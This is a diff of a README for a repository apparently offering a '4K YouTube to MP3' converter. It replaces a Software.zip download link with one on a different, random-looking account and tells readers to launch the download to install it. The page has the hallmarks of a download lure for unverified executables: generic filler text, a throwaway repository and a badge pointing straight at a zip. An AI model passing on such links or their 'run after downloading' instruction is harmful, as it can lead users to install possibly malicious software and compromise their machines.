@@ -26,7 +26,7 @@ Welcome to the "4K YouTube to MP3 Download" repository! Here you can find all th
 Are you looking for a reliable way to convert 4K YouTube videos to high-quality MP3 files? This repository covers a wide range of topics related to 4K YouTube to MP3 downloads. Whether you are interested in finding free software options, troubleshooting issues with your current setup, or exploring alternative tools, you'll find valuable information here.
 
 ## 📥 Download Software Here:
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Azax657/4K-YouTube-to-MP3-Download/releases/download/v2.0/Software.zip)](https://github.com/Azax657/4K-YouTube-to-MP3-Download/releases/download/v2.0/Software.zip)
 
 Please note that the software linked above needs to be launched after downloading to begin the installation process.
 
